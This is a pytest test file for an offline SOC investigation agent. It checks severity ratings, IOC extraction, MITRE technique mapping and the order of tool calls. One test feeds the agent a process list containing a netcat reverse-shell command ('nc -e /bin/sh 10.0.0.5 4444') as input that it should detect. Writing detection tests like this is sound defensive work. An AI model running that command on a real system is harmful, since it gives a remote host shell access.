from pathlib import Path

import pytest

from soc_agent.agent import SocAgent

SAMPLE_INCIDENT = (Path(__file__).resolve().parent.parent / "examples" / "sample_incident.txt").read_text()


@pytest.fixture(autouse=True)
def _no_api_key(monkeypatch):
    # Force offline mode regardless of the host environment.
    monkeypatch.delenv("ANTHROPIC_API_KEY", raising=False)


def test_offline_agent_is_not_live_without_api_key():
    agent = SocAgent()
    assert agent.is_live is False


def test_offline_investigation_on_clean_text_is_low_severity():
    agent = SocAgent()
    report = agent.investigate("All systems nominal, no anomalies detected today.")
    assert report.severity == "low"
    assert report.llm_backed is False
    assert report.trace  # tools were still called


def test_offline_investigation_on_sample_incident_is_critical():
    agent = SocAgent()
    report = agent.investigate(SAMPLE_INCIDENT)

    assert report.severity == "critical"
    assert "194.61.24.102" in report.iocs["ips"]
    assert "45.155.205.233" in report.iocs["ips"]
    assert "44d88612fea8a8f36de82e1278abb02f" in report.iocs["hashes"]
    assert "T1110" in report.technique_ids  # brute force
    assert "T1068" in report.technique_ids  # sudo privilege escalation
    assert report.recommended_actions
    assert not report.llm_backed


def test_offline_investigation_follows_expected_tool_trace():
    agent = SocAgent()
    report = agent.investigate(SAMPLE_INCIDENT)
    tool_names = [record.tool for record in report.trace]

    assert tool_names[0] == "extract_iocs"
    assert "check_threat_intel" in tool_names
    assert "analyze_auth_log" in tool_names
    assert "lookup_mitre_technique" in tool_names
    # An unrelated known-good IP was not part of the incident and should never appear.
    assert all(record.input.get("indicator") != "8.8.8.8" for record in report.trace)


def test_offline_investigation_includes_process_findings_when_provided():
    agent = SocAgent()
    report = agent.investigate(
        "Routine check-in, nothing unusual in the logs.",
        processes=["nc -e /bin/sh 10.0.0.5 4444", "/usr/bin/python3 app.py"],
    )
    assert report.severity in {"high", "critical"}
    assert any(t == "T1059" for t in report.technique_ids)
    process_trace = next(r for r in report.trace if r.tool == "check_process_list")
    assert len(process_trace.output["suspicious"]) == 1


def test_report_to_dict_round_trips_key_fields():
    agent = SocAgent()
    report = agent.investigate(SAMPLE_INCIDENT)
    payload = report.to_dict()
    assert payload["severity"] == report.severity
    assert payload["llm_backed"] is False
    assert len(payload["trace"]) == len(report.trace)
